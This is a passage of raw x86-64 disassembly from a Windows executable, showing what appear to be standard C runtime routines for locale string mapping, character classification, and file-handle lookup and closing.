   140008f7d:	41 3b c0             	cmp    %r8d,%eax
   140008f80:	0f 84 07 01 00 00    	je     0x14000908d
   140008f86:	3b f0                	cmp    %eax,%esi
   140008f88:	0f 8f ff 00 00 00    	jg     0x14000908d
   140008f8e:	8b 4d 08             	mov    0x8(%rbp),%ecx
   140008f91:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008f95:	48 8b 45 78          	mov    0x78(%rbp),%rax
   140008f99:	45 8b cf             	mov    %r15d,%r9d
   140008f9c:	4c 8b c7             	mov    %rdi,%r8
   140008f9f:	41 8b d2             	mov    %r10d,%edx
   140008fa2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008fa7:	ff 15 db 50 00 00    	call   *0x50db(%rip)        # 0x14000e088
   140008fad:	e9 db 00 00 00       	jmp    0x14000908d
   140008fb2:	41 3b f0             	cmp    %r8d,%esi
   140008fb5:	7e 60                	jle    0x140009017
   140008fb7:	33 d2                	xor    %edx,%edx
   140008fb9:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140008fbd:	48 f7 f6             	div    %rsi
   140008fc0:	48 83 f8 02          	cmp    $0x2,%rax
   140008fc4:	72 51                	jb     0x140009017
   140008fc6:	48 8d 4c 36 10       	lea    0x10(%rsi,%rsi,1),%rcx
   140008fcb:	49 3b cd             	cmp    %r13,%rcx
   140008fce:	77 2a                	ja     0x140008ffa
   140008fd0:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008fd4:	48 3b c1             	cmp    %rcx,%rax
   140008fd7:	77 03                	ja     0x140008fdc
   140008fd9:	48 8b c3             	mov    %rbx,%rax
   140008fdc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140008fe0:	e8 bb 32 00 00       	call   0x14000c2a0
   140008fe5:	48 2b e0             	sub    %rax,%rsp
   140008fe8:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140008fed:	49 3b d8             	cmp    %r8,%rbx
   140008ff0:	74 1f                	je     0x140009011
   140008ff2:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140008ff8:	eb 13                	jmp    0x14000900d
   140008ffa:	e8 a1 98 ff ff       	call   0x1400028a0
   140008fff:	45 33 c0             	xor    %r8d,%r8d
   140009002:	48 8b d8             	mov    %rax,%rbx
   140009005:	49 3b c0             	cmp    %r8,%rax
   140009008:	74 07                	je     0x140009011
   14000900a:	44 89 30             	mov    %r14d,(%rax)
   14000900d:	48 83 c3 10          	add    $0x10,%rbx
   140009011:	44 8b 55 00          	mov    0x0(%rbp),%r10d
   140009015:	eb 03                	jmp    0x14000901a
   140009017:	49 8b d8             	mov    %r8,%rbx
   14000901a:	49 3b d8             	cmp    %r8,%rbx
   14000901d:	74 6e                	je     0x14000908d
   14000901f:	8b 4d 08             	mov    0x8(%rbp),%ecx
   140009022:	45 8b cf             	mov    %r15d,%r9d
   140009025:	4c 8b c7             	mov    %rdi,%r8
   140009028:	41 8b d2             	mov    %r10d,%edx
   14000902b:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000902f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009034:	ff 15 4e 50 00 00    	call   *0x504e(%rip)        # 0x14000e088
   14000903a:	33 c9                	xor    %ecx,%ecx
   14000903c:	3b c1                	cmp    %ecx,%eax
   14000903e:	74 3f                	je     0x14000907f
   140009040:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   140009046:	33 d2                	xor    %edx,%edx
   140009048:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000904d:	44 8b ce             	mov    %esi,%r9d
   140009050:	4c 8b c3             	mov    %rbx,%r8
   140009053:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009058:	3b c1                	cmp    %ecx,%eax
   14000905a:	75 0b                	jne    0x140009067
   14000905c:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140009060:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009065:	eb 0d                	jmp    0x140009074
   140009067:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000906b:	48 8b 45 78          	mov    0x78(%rbp),%rax
   14000906f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009074:	41 8b cc             	mov    %r12d,%ecx
   140009077:	ff 15 7b 51 00 00    	call   *0x517b(%rip)        # 0x14000e1f8
   14000907d:	8b f0                	mov    %eax,%esi
   14000907f:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140009083:	44 39 31             	cmp    %r14d,(%rcx)
   140009086:	75 05                	jne    0x14000908d
   140009088:	e8 8b 99 ff ff       	call   0x140002a18
   14000908d:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   140009091:	44 39 31             	cmp    %r14d,(%rcx)
   140009094:	75 05                	jne    0x14000909b
   140009096:	e8 7d 99 ff ff       	call   0x140002a18
   14000909b:	8b c6                	mov    %esi,%eax
   14000909d:	e9 cd 01 00 00       	jmp    0x14000926f
   1400090a2:	48 8b f7             	mov    %rdi,%rsi
   1400090a5:	4c 8b e7             	mov    %rdi,%r12
   1400090a8:	44 3b f7             	cmp    %edi,%r14d
   1400090ab:	75 0b                	jne    0x1400090b8
   1400090ad:	48 8b 03             	mov    (%rbx),%rax
   1400090b0:	44 8b 70 14          	mov    0x14(%rax),%r14d
   1400090b4:	44 89 75 08          	mov    %r14d,0x8(%rbp)
   1400090b8:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   1400090be:	85 ff                	test   %edi,%edi
   1400090c0:	75 06                	jne    0x1400090c8
   1400090c2:	48 8b 03             	mov    (%rbx),%rax
   1400090c5:	8b 78 04             	mov    0x4(%rax),%edi
   1400090c8:	41 8b ce             	mov    %r14d,%ecx
   1400090cb:	e8 74 0a 00 00       	call   0x140009b44
   1400090d0:	44 8b e8             	mov    %eax,%r13d
   1400090d3:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400090d6:	75 07                	jne    0x1400090df
   1400090d8:	33 c0                	xor    %eax,%eax
   1400090da:	e9 90 01 00 00       	jmp    0x14000926f
   1400090df:	4c 8b 7d 78          	mov    0x78(%rbp),%r15
   1400090e3:	4c 8b 45 10          	mov    0x10(%rbp),%r8
   1400090e7:	3b c7                	cmp    %edi,%eax
   1400090e9:	0f 84 3c 01 00 00    	je     0x14000922b
   1400090ef:	33 db                	xor    %ebx,%ebx
   1400090f1:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   1400090f5:	8b d0                	mov    %eax,%edx
   1400090f7:	8b cf                	mov    %edi,%ecx
   1400090f9:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400090fd:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009102:	e8 91 0a 00 00       	call   0x140009b98
   140009107:	48 8b f0             	mov    %rax,%rsi
   14000910a:	48 3b c3             	cmp    %rbx,%rax
   14000910d:	74 c9                	je     0x1400090d8
   14000910f:	44 8b 4d 70          	mov    0x70(%rbp),%r9d
   140009113:	8b 55 00             	mov    0x0(%rbp),%edx
   140009116:	4c 8b c0             	mov    %rax,%r8
   140009119:	41 8b ce             	mov    %r14d,%ecx
   14000911c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140009120:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009125:	ff 15 65 4f 00 00    	call   *0x4f65(%rip)        # 0x14000e090
   14000912b:	4c 63 c8             	movslq %eax,%r9
   14000912e:	44 89 4d 04          	mov    %r9d,0x4(%rbp)
   140009132:	44 3b cb             	cmp    %ebx,%r9d
   140009135:	75 07                	jne    0x14000913e
   140009137:	8b fb                	mov    %ebx,%edi
   140009139:	e9 10 01 00 00       	jmp    0x14000924e
   14000913e:	44 3b cb             	cmp    %ebx,%r9d
   140009141:	41 be dd dd 00 00    	mov    $0xdddd,%r14d
   140009147:	7e 62                	jle    0x1400091ab
   140009149:	49 8b c9             	mov    %r9,%rcx
   14000914c:	49 83 f9 e0          	cmp    $0xffffffffffffffe0,%r9
   140009150:	77 59                	ja     0x1400091ab
   140009152:	48 83 c1 10          	add    $0x10,%rcx
   140009156:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000915d:	77 34                	ja     0x140009193
   14000915f:	48 8d 59 0f          	lea    0xf(%rcx),%rbx
   140009163:	48 3b d9             	cmp    %rcx,%rbx
   140009166:	77 0a                	ja     0x140009172
   140009168:	48 bb f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rbx
   14000916f:	ff ff 0f 
   140009172:	48 83 e3 f0          	and    $0xfffffffffffffff0,%rbx
   140009176:	48 8b c3             	mov    %rbx,%rax
   140009179:	e8 22 31 00 00       	call   0x14000c2a0
   14000917e:	48 2b e3             	sub    %rbx,%rsp
   140009181:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140009186:	48 85 db             	test   %rbx,%rbx
   140009189:	74 25                	je     0x1400091b0
   14000918b:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140009191:	eb 10                	jmp    0x1400091a3
   140009193:	e8 08 97 ff ff       	call   0x1400028a0
   140009198:	48 8b d8             	mov    %rax,%rbx
   14000919b:	48 85 c0             	test   %rax,%rax
   14000919e:	74 07                	je     0x1400091a7
   1400091a0:	44 89 30             	mov    %r14d,(%rax)
   1400091a3:	48 83 c3 10          	add    $0x10,%rbx
   1400091a7:	44 8b 4d 04          	mov    0x4(%rbp),%r9d
   1400091ab:	48 85 db             	test   %rbx,%rbx
   1400091ae:	75 04                	jne    0x1400091b4
   1400091b0:	33 db                	xor    %ebx,%ebx
   1400091b2:	eb 83                	jmp    0x140009137
   1400091b4:	4d 63 c1             	movslq %r9d,%r8
   1400091b7:	33 d2                	xor    %edx,%edx
   1400091b9:	48 8b cb             	mov    %rbx,%rcx
   1400091bc:	e8 af 98 ff ff       	call   0x140002a70
   1400091c1:	44 8b 5d 04          	mov    0x4(%rbp),%r11d
   1400091c5:	44 8b 4d 70          	mov    0x70(%rbp),%r9d
   1400091c9:	8b 55 00             	mov    0x0(%rbp),%edx
   1400091cc:	8b 4d 08             	mov    0x8(%rbp),%ecx
   1400091cf:	44 89 5c 24 28       	mov    %r11d,0x28(%rsp)
   1400091d4:	4c 8b c6             	mov    %rsi,%r8
   1400091d7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400091dc:	ff 15 ae 4e 00 00    	call   *0x4eae(%rip)        # 0x14000e090
   1400091e2:	89 45 04             	mov    %eax,0x4(%rbp)
   1400091e5:	85 c0                	test   %eax,%eax
   1400091e7:	75 04                	jne    0x1400091ed
   1400091e9:	33 ff                	xor    %edi,%edi
   1400091eb:	eb 2e                	jmp    0x14000921b
   1400091ed:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   1400091f3:	4c 8d 4d 04          	lea    0x4(%rbp),%r9
   1400091f7:	4c 8b c3             	mov    %rbx,%r8
   1400091fa:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400091fe:	8b d7                	mov    %edi,%edx
   140009200:	41 8b cd             	mov    %r13d,%ecx
   140009203:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140009208:	e8 8b 09 00 00       	call   0x140009b98
   14000920d:	8b 7d 04             	mov    0x4(%rbp),%edi
   140009210:	4c 8b e0             	mov    %rax,%r12
   140009213:	33 c0                	xor    %eax,%eax
   140009215:	4c 3b e0             	cmp    %rax,%r12
   140009218:	0f 44 f8             	cmove  %eax,%edi
   14000921b:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000921f:	44 39 31             	cmp    %r14d,(%rcx)
   140009222:	75 28                	jne    0x14000924c
   140009224:	e8 ef 97 ff ff       	call   0x140002a18
   140009229:	eb 21                	jmp    0x14000924c
   14000922b:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   140009231:	44 8b 4d 70          	mov    0x70(%rbp),%r9d
   140009235:	8b 55 00             	mov    0x0(%rbp),%edx
   140009238:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000923c:	41 8b ce             	mov    %r14d,%ecx
   14000923f:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140009244:	ff 15 46 4e 00 00    	call   *0x4e46(%rip)        # 0x14000e090
   14000924a:	8b f8                	mov    %eax,%edi
   14000924c:	33 db                	xor    %ebx,%ebx
   14000924e:	48 3b f3             	cmp    %rbx,%rsi
   140009251:	74 08                	je     0x14000925b
   140009253:	48 8b ce             	mov    %rsi,%rcx
   140009256:	e8 bd 97 ff ff       	call   0x140002a18
   14000925b:	4c 3b e3             	cmp    %rbx,%r12
   14000925e:	74 0d                	je     0x14000926d
   140009260:	4d 3b fc             	cmp    %r12,%r15
   140009263:	74 08                	je     0x14000926d
   140009265:	49 8b cc             	mov    %r12,%rcx
   140009268:	e8 ab 97 ff ff       	call   0x140002a18
   14000926d:	8b c7                	mov    %edi,%eax
   14000926f:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140009273:	48 33 cd             	xor    %rbp,%rcx
   140009276:	e8 c5 87 ff ff       	call   0x140001a40
   14000927b:	48 8b 5d 50          	mov    0x50(%rbp),%rbx
   14000927f:	48 8b 75 58          	mov    0x58(%rbp),%rsi
   140009283:	48 8b 7d 60          	mov    0x60(%rbp),%rdi
   140009287:	48 8d 65 20          	lea    0x20(%rbp),%rsp
   14000928b:	41 5f                	pop    %r15
   14000928d:	41 5e                	pop    %r14
   14000928f:	41 5d                	pop    %r13
   140009291:	41 5c                	pop    %r12
   140009293:	5d                   	pop    %rbp
   140009294:	c3                   	ret
   140009295:	cc                   	int3
   140009296:	cc                   	int3
   140009297:	cc                   	int3
   140009298:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000929d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400092a2:	57                   	push   %rdi
   1400092a3:	48 83 ec 70          	sub    $0x70,%rsp
   1400092a7:	8b f2                	mov    %edx,%esi
   1400092a9:	48 8b d1             	mov    %rcx,%rdx
   1400092ac:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400092b1:	49 8b d9             	mov    %r9,%rbx
   1400092b4:	41 8b f8             	mov    %r8d,%edi
   1400092b7:	e8 c4 b3 ff ff       	call   0x140004680
   1400092bc:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   1400092c3:	44 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%r11d
   1400092ca:	00 
   1400092cb:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400092d0:	44 89 5c 24 40       	mov    %r11d,0x40(%rsp)
   1400092d5:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400092d9:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   1400092e0:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400092e4:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   1400092eb:	00 
   1400092ec:	4c 8b cb             	mov    %rbx,%r9
   1400092ef:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400092f4:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   1400092fb:	44 8b c7             	mov    %edi,%r8d
   1400092fe:	8b d6                	mov    %esi,%edx
   140009300:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140009304:	e8 4f fa ff ff       	call   0x140008d58
   140009309:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000930e:	74 0c                	je     0x14000931c
   140009310:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140009315:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000931c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140009321:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140009325:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140009329:	49 8b e3             	mov    %r11,%rsp
   14000932c:	5f                   	pop    %rdi
   14000932d:	c3                   	ret
   14000932e:	cc                   	int3
   14000932f:	cc                   	int3
   140009330:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009335:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000933a:	57                   	push   %rdi
   14000933b:	48 83 ec 60          	sub    $0x60,%rsp
   14000933f:	48 63 f9             	movslq %ecx,%rdi
   140009342:	8b ea                	mov    %edx,%ebp
   140009344:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140009349:	49 8b d0             	mov    %r8,%rdx
   14000934c:	e8 2f b3 ff ff       	call   0x140004680
   140009351:	44 8d 5f 01          	lea    0x1(%rdi),%r11d
   140009355:	41 81 fb 00 01 00 00 	cmp    $0x100,%r11d
   14000935c:	77 15                	ja     0x140009373
   14000935e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009363:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   14000936a:	0f b7 04 79          	movzwl (%rcx,%rdi,2),%eax
   14000936e:	e9 9f 00 00 00       	jmp    0x140009412
   140009373:	8b f7                	mov    %edi,%esi
   140009375:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000937a:	c1 fe 08             	sar    $0x8,%esi
   14000937d:	40 0f b6 ce          	movzbl %sil,%ecx
   140009381:	e8 c6 ea ff ff       	call   0x140007e4c
   140009386:	ba 01 00 00 00       	mov    $0x1,%edx
   14000938b:	85 c0                	test   %eax,%eax
   14000938d:	74 1e                	je     0x1400093ad
   14000938f:	40 88 b4 24 88 00 00 	mov    %sil,0x88(%rsp)
   140009396:	00 
   140009397:	40 88 bc 24 89 00 00 	mov    %dil,0x89(%rsp)
   14000939e:	00 
   14000939f:	c6 84 24 8a 00 00 00 	movb   $0x0,0x8a(%rsp)
   1400093a6:	00 
   1400093a7:	44 8d 4a 01          	lea    0x1(%rdx),%r9d
   1400093ab:	eb 13                	jmp    0x1400093c0
   1400093ad:	40 88 bc 24 88 00 00 	mov    %dil,0x88(%rsp)
   1400093b4:	00 
   1400093b5:	c6 84 24 89 00 00 00 	movb   $0x0,0x89(%rsp)
   1400093bc:	00 
   1400093bd:	44 8b ca             	mov    %edx,%r9d
   1400093c0:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400093c5:	89 54 24 38          	mov    %edx,0x38(%rsp)
   1400093c9:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
   1400093d0:	00 
   1400093d1:	8b 41 14             	mov    0x14(%rcx),%eax
   1400093d4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400093d8:	8b 41 04             	mov    0x4(%rcx),%eax
   1400093db:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400093e0:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400093e4:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400093e9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400093ee:	e8 11 f8 ff ff       	call   0x140008c04
   1400093f3:	85 c0                	test   %eax,%eax
   1400093f5:	75 16                	jne    0x14000940d
   1400093f7:	38 44 24 58          	cmp    %al,0x58(%rsp)
   1400093fb:	74 0c                	je     0x140009409
   1400093fd:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140009402:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   140009409:	33 c0                	xor    %eax,%eax
   14000940b:	eb 1a                	jmp    0x140009427
   14000940d:	0f b7 44 24 70       	movzwl 0x70(%rsp),%eax
   140009412:	23 c5                	and    %ebp,%eax
   140009414:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   140009419:	74 0c                	je     0x140009427
   14000941b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140009420:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009427:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000942c:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140009430:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140009434:	49 8b e3             	mov    %r11,%rsp
   140009437:	5f                   	pop    %rdi
   140009438:	c3                   	ret
   140009439:	cc                   	int3
   14000943a:	cc                   	int3
   14000943b:	cc                   	int3
   14000943c:	cc                   	int3
   14000943d:	cc                   	int3
   14000943e:	cc                   	int3
   14000943f:	cc                   	int3
   140009440:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009445:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000944a:	57                   	push   %rdi
   14000944b:	48 83 ec 20          	sub    $0x20,%rsp
   14000944f:	85 c9                	test   %ecx,%ecx
   140009451:	78 73                	js     0x1400094c6
   140009453:	3b 0d 0f d1 00 00    	cmp    0xd10f(%rip),%ecx        # 0x140016568
   140009459:	73 6b                	jae    0x1400094c6
   14000945b:	48 63 d9             	movslq %ecx,%rbx
   14000945e:	48 8d 2d 1b d1 00 00 	lea    0xd11b(%rip),%rbp        # 0x140016580
   140009465:	48 8b fb             	mov    %rbx,%rdi
   140009468:	83 e3 1f             	and    $0x1f,%ebx
   14000946b:	48 c1 ff 05          	sar    $0x5,%rdi
   14000946f:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   140009473:	48 8b 44 fd 00       	mov    0x0(%rbp,%rdi,8),%rax
   140009478:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   14000947d:	74 47                	je     0x1400094c6
   14000947f:	48 83 3c 18 ff       	cmpq   $0xffffffffffffffff,(%rax,%rbx,1)
   140009484:	74 40                	je     0x1400094c6
   140009486:	83 3d b3 9b 00 00 01 	cmpl   $0x1,0x9bb3(%rip)        # 0x140013040
   14000948d:	75 29                	jne    0x1400094b8
   14000948f:	85 c9                	test   %ecx,%ecx
   140009491:	74 18                	je     0x1400094ab
   140009493:	83 e9 01             	sub    $0x1,%ecx
   140009496:	74 0c                	je     0x1400094a4
   140009498:	83 f9 01             	cmp    $0x1,%ecx
   14000949b:	75 1b                	jne    0x1400094b8
   14000949d:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1400094a2:	eb 0c                	jmp    0x1400094b0
   1400094a4:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1400094a9:	eb 05                	jmp    0x1400094b0
   1400094ab:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   1400094b0:	33 d2                	xor    %edx,%edx
   1400094b2:	ff 15 c8 4b 00 00    	call   *0x4bc8(%rip)        # 0x14000e080
   1400094b8:	48 8b 44 fd 00       	mov    0x0(%rbp,%rdi,8),%rax
   1400094bd:	48 83 0c 03 ff       	orq    $0xffffffffffffffff,(%rbx,%rax,1)
   1400094c2:	33 c0                	xor    %eax,%eax
   1400094c4:	eb 16                	jmp    0x1400094dc
   1400094c6:	e8 d9 9b ff ff       	call   0x1400030a4
   1400094cb:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400094d1:	e8 ee 9b ff ff       	call   0x1400030c4
   1400094d6:	83 20 00             	andl   $0x0,(%rax)
   1400094d9:	83 c8 ff             	or     $0xffffffff,%eax
   1400094dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400094e1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400094e6:	48 83 c4 20          	add    $0x20,%rsp
   1400094ea:	5f                   	pop    %rdi
   1400094eb:	c3                   	ret
   1400094ec:	48 83 ec 38          	sub    $0x38,%rsp
   1400094f0:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   1400094f3:	75 15                	jne    0x14000950a
   1400094f5:	e8 ca 9b ff ff       	call   0x1400030c4
   1400094fa:	83 20 00             	andl   $0x0,(%rax)
   1400094fd:	e8 a2 9b ff ff       	call   0x1400030a4
   140009502:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009508:	eb 5d                	jmp    0x140009567
   14000950a:	85 c9                	test   %ecx,%ecx
   14000950c:	78 31                	js     0x14000953f
   14000950e:	3b 0d 54 d0 00 00    	cmp    0xd054(%rip),%ecx        # 0x140016568
   140009514:	73 29                	jae    0x14000953f
   140009516:	48 63 d1             	movslq %ecx,%rdx
   140009519:	48 8d 0d 60 d0 00 00 	lea    0xd060(%rip),%rcx        # 0x140016580
   140009520:	48 8b c2             	mov    %rdx,%rax
   140009523:	83 e2 1f             	and    $0x1f,%edx
   140009526:	48 c1 f8 05          	sar    $0x5,%rax
   14000952a:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   14000952e:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140009532:	f6 44 10 08 01       	testb  $0x1,0x8(%rax,%rdx,1)
   140009537:	74 06                	je     0x14000953f
   140009539:	48 8b 04 10          	mov    (%rax,%rdx,1),%rax
   14000953d:	eb 2c                	jmp    0x14000956b
   14000953f:	e8 80 9b ff ff       	call   0x1400030c4
   140009544:	83 20 00             	andl   $0x0,(%rax)
   140009547:	e8 58 9b ff ff       	call   0x1400030a4
   14000954c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009552:	45 33 c9             	xor    %r9d,%r9d
   140009555:	45 33 c0             	xor    %r8d,%r8d
   140009558:	33 d2                	xor    %edx,%edx
   14000955a:	33 c9                	xor    %ecx,%ecx
   14000955c:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009562:	e8 6d 9a ff ff       	call   0x140002fd4
   140009567:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000956b:	48 83 c4 38          	add    $0x38,%rsp
   14000956f:	c3                   	ret
   140009570:	48 8b c4             	mov    %rsp,%rax
   140009573:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009577:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000957b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000957f:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140009583:	41 55                	push   %r13
   140009585:	48 83 ec 20          	sub    $0x20,%rsp
   140009589:	48 63 d9             	movslq %ecx,%rbx
   14000958c:	4c 8b e3             	mov    %rbx,%r12
   14000958f:	49 c1 fc 05          	sar    $0x5,%r12
   140009593:	4c 8d 2d e6 cf 00 00 	lea    0xcfe6(%rip),%r13        # 0x140016580
   14000959a:	83 e3 1f             	and    $0x1f,%ebx
   14000959d:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   1400095a1:	4b 8b 74 e5 00       	mov    0x0(%r13,%r12,8),%rsi
   1400095a6:	bf 01 00 00 00       	mov    $0x1,%edi
   1400095ab:	83 7c 33 0c 00       	cmpl   $0x0,0xc(%rbx,%rsi,1)
   1400095b0:	75 33                	jne    0x1400095e5
   1400095b2:	8d 4f 09             	lea    0x9(%rdi),%ecx
   1400095b5:	e8 b2 a6 ff ff       	call   0x140003c6c
   1400095ba:	90                   	nop
   1400095bb:	83 7c 33 0c 00       	cmpl   $0x0,0xc(%rbx,%rsi,1)
   1400095c0:	75 19                	jne    0x1400095db
   1400095c2:	48 8d 4c 33 10       	lea    0x10(%rbx,%rsi,1),%rcx
   1400095c7:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400095cc:	e8 e7 ae ff ff       	call   0x1400044b8
   1400095d1:	f7 d8                	neg    %eax
   1400095d3:	1b d2                	sbb    %edx,%edx
   1400095d5:	23 fa                	and    %edx,%edi
   1400095d7:	ff 44 33 0c          	incl   0xc(%rbx,%rsi,1)
   1400095db:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400095e0:	e8 87 a5 ff ff       	call   0x140003b6c
   1400095e5:	85 ff                	test   %edi,%edi
   1400095e7:	74 10                	je     0x1400095f9
   1400095e9:	4b 8b 4c e5 00       	mov    0x0(%r13,%r12,8),%rcx
   1400095ee:	48 8d 4c 19 10       	lea    0x10(%rcx,%rbx,1),%rcx
   1400095f3:	ff 15 cf 4b 00 00    	call   *0x4bcf(%rip)        # 0x14000e1c8
   1400095f9:	8b c7                	mov    %edi,%eax
   1400095fb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009600:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009605:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000960a:	4c 8b 64 24 48       	mov    0x48(%rsp),%r12
   14000960f:	48 83 c4 20          	add    $0x20,%rsp
   140009613:	41 5d                	pop    %r13
   140009615:	c3                   	ret
   140009616:	cc                   	int3
   140009617:	cc                   	int3
   140009618:	48 63 d1             	movslq %ecx,%rdx
   14000961b:	48 8d 0d 5e cf 00 00 	lea    0xcf5e(%rip),%rcx        # 0x140016580
   140009622:	48 8b c2             	mov    %rdx,%rax
   140009625:	83 e2 1f             	and    $0x1f,%edx
   140009628:	48 c1 f8 05          	sar    $0x5,%rax
   14000962c:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   140009630:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140009634:	48 8d 4c 10 10       	lea    0x10(%rax,%rdx,1),%rcx
   140009639:	48 ff 25 80 4b 00 00 	rex.W jmp *0x4b80(%rip)        # 0x14000e1c0
   140009640:	48 83 ec 68          	sub    $0x68,%rsp
   140009644:	48 8b 05 fd 99 00 00 	mov    0x99fd(%rip),%rax        # 0x140013048
   14000964b:	48 33 c4             	xor    %rsp,%rax
   14000964e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140009653:	83 3d c6 ac 00 00 00 	cmpl   $0x0,0xacc6(%rip)        # 0x140014320
   14000965a:	66 89 4c 24 40       	mov    %cx,0x40(%rsp)
   14000965f:	74 66                	je     0x1400096c7
   140009661:	48 8b 0d 90 ad 00 00 	mov    0xad90(%rip),%rcx        # 0x1400143f8
   140009668:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   14000966c:	75 0c                	jne    0x14000967a
   14000966e:	e8 ad 07 00 00       	call   0x140009e20
